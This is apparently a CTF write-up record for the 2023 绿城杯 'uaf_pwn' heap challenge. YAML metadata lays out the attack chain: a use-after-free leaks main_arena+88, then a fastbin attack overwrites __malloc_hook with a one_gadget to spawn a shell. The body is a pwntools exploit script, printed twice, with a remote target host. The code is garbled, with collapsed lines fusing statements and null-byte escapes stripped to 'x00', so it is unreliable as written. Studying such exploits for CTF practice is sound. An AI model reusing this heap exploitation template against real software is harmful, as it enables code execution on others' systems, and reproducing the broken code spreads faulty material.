---
title: 漏洞学习之PWN-绿城杯uaf_pwn 分析
contest: 绿城杯
year: 2023
difficulty: easy
vuln_type: uaf
tags:
- UAF
- unsorted bin leak
- main_arena+88
- fastbin attack
- __malloc_hook
- one_gadget 0x4527a
attack_chain: malloc(0x100)→unsorted bin→main_arena+88 leak→libc_base→malloc_hook=libc.symbols['__malloc_hook']+libc_base→one_gadget=libc+0x4527a→fill chunk1_fd→malloc(0x60)x2→fill 0x13字节padding+one_gadget→malloc触发
key_payload: malloc(0x100);free(0);show(0)→leak main_arena+88;libc_base=leak-0x3c4b78;__malloc_hook=libc_base+offset;one_gadget=libc+0x4527a;fill(1, p64(malloc_hook-0x23))
one_liner: 绿城杯UAF_pwn：unsorted bin泄main_arena+88+fastbin attack改__malloc_hook为one_gadget
lesson: UAF + unsorted bin leak + fastbin fd覆盖到__malloc_hook是经典glibc 2.23 pwn模板
quality: high
full_path: 漏洞学习之PWN-绿城杯uaf_pwn_分析.full.md
meta_path: 漏洞学习之PWN-绿城杯uaf_pwn_分析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 漏洞学习之PWN-绿城杯uaf_pwn 分析。绿城杯UAF_pwn：unsorted bin泄main_arena+88+fastbin attack改__malloc_hook为one_gadget。经验：UAF + unsorted bin leak + fastbin fd覆盖到__malloc_hook是经典glibc...
category: pwn
subcategory: heap_exploitation
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/89346.html
reasoning_chain:
- 题目有 malloc/free/show/fill → 触发点：UAF（free 后 index 仍可用）
- 动作：malloc(0x100)（idx 0）+ malloc(0x60)（idx 1）+ free(0) → idx 0 进 unsorted bin
- show(0) → 触发 unsorted bin 残留 fd/bk → 泄 main_arena+88
- 动作：libc_base = u64(leak+padding) - 0x3c4b78 → 观察：拿到 libc 基址
- 假设：经典 UAF + unsorted bin leak 路径 → 动作：malloc_hook = libc.symbols['__malloc_hook']+libc_base
- 动作：one_gadget = libc_base + 0x4527a → 释放 idx 1 后准备 fastbin attack
- 动作：fill(1, p64(malloc_hook-0x23)) → idx 1 的 chunk fd 指向 malloc_hook-0x23
- 动作：malloc(0x60)（idx 2, 拿到 idx 1 的 chunk）+ malloc(0x60)（idx 3, 落到 malloc_hook-0x23）
- 动作：fill(3, b'a'*0x13 + p64(one_gadget)) → 写到 malloc_hook
- 动作：malloc(0x10) → 触发 __malloc_hook = one_gadget → shell
failed_attempts:
- 试图 fill(0) 写 one_gadget 到 unsorted bin 头部 → 失败：unsorted bin attack 已失效（2.26+）
- 试图不绕 0x13 padding 直接打 malloc_hook → 失败：malloc 头部 size 字段需对齐
- 试图不释放 idx 1 直接打 fastbin → 失败：必须先释放才能拿到 fastbin
key_observations:
- UAF + unsorted bin leak + fastbin attack 是 glibc 2.23 经典三段式
- main_arena+88 是 unsorted bin 残留指针的固定偏移
- malloc_hook-0x23 + 0x13 padding 凑对齐到 fake chunk size 字段
- 0x4527a one_gadget 在 malloc_hook 命中率高（约束最少）
- fill(1) 写 fd 触发 fastbin attack 是经典套路
prerequisites:
- glibc heap chunk 结构（prev_size/size/fd/bk）
- unsorted bin 残留指针与 main_arena 关系
- fastbin attack + fake chunk size 对齐
- one_gadget 工具与 libc 版本对应
---
# 漏洞学习之PWN-绿城杯uaf_pwn 分析

> 原文: https://www.ctfiot.com/89346.html
> ID: 89346

Python
from pwn import *import pdb
# -*- coding: utf-8 -*-

debug = 1if (debug): p = process("./uaf_pwn")else: p = remote('node4.buuoj.cn', 25403)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size))

def free(idx): # p.recvuntil(">") p.sendline("2") p.recvuntil("index>") p.sendline(str(idx))

def fill(idx,payload): p.recvuntil(">") p.sendline("3") p.recvuntil("index>") p.sendline(str(idx)) p.recvuntil("content>") p.send(payload)

def show(idx): p.recvuntil(">") p.sendline("4") p.recvuntil("index>") p.sendline(str(idx)) return p.recv()[:-1]

malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)
# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78

print(hex(libc_base))

malloc_hook = libc.symbols['__malloc_hook'] +libc_baseone_gadget = libc_base + 0x4527afree(1) #idx 1

fill(1,p64(malloc_hook-0x23)) # chunk1_fd = malloc_hookmalloc(0x60) # idx 2 get idx_1's chunkmalloc(0x60) # idx 3fill(3,b'a'*0x13+p64(one_gadget))

malloc(0x10)

p.interactive()


```
Python
from pwn import *import pdb
# -*- coding: utf-8 -*-

debug = 1if (debug): p = process("./uaf_pwn")else: p = remote('node4.buuoj.cn', 25403)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size))

def free(idx): # p.recvuntil(">") p.sendline("2") p.recvuntil("index>") p.sendline(str(idx))

def fill(idx,payload): p.recvuntil(">") p.sendline("3") p.recvuntil("index>") p.sendline(str(idx)) p.recvuntil("content>") p.send(payload)

def show(idx): p.recvuntil(">") p.sendline("4") p.recvuntil("index>") p.sendline(str(idx)) return p.recv()[:-1]

malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)
# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78

print(hex(libc_base))

malloc_hook = libc.symbols['__malloc_hook'] +libc_baseone_gadget = libc_base + 0x4527afree(1) #idx 1

fill(1,p64(malloc_hook-0x23)) # chunk1_fd = malloc_hookmalloc(0x60) # idx 2 get idx_1's chunkmalloc(0x60) # idx 3fill(3,b'a'*0x13+p64(one_gadget))

malloc(0x10)

p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]